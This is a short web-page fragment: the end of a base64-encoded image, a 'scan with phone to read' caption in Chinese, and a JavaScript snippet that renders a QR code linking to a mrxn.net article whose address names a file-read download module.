gmuA2kJn0lzvYN6+lXrWvU9T5WOqQfBPc1dW1dYfFZVK7CHKQXBNVXWLUVED8Ez/yfyW8DWRXf+teewGEgkOnDiKtt1Z0zi+7Xow7pL1+hdaI+SD0c8cxjL1G/2HXIGuoiRLcOwmFE89bJRfXCw0A03fg9J/DXBgK5K/qXAaMO4XU3VEA4BHu9HMZ81fbQqy5fIcx76ofk7Qfh5tXlorqoDqlf8dL/2kCq2R1/fgJ/PBDI1L0bIByCbhHC9anLV6hvhZC+wGYBnp8rznr2PKTORublVxHGPr0Okrc/hAP3/1N/vNnr8IQ4tY6rfeuDTFmfeucw+syvEEa/fSG6vLD3gHi6LofkIVg9KiAcRjyrM189KiD1Xa9cxUw/DETTjd9zAttAINOE13h1m5A+dSdUWFfXFZA8zLH75Vew+lesvJA1y1Ox8nW9vPswD+knF/feuoa5D6ID98+Qx5u9tifkzfb1v93OvwAAAP//u+KvpgAAAAZJREFUAwCxVoC2YhyeYQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/51mis-modules-Accounts-Playforrecord-download-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 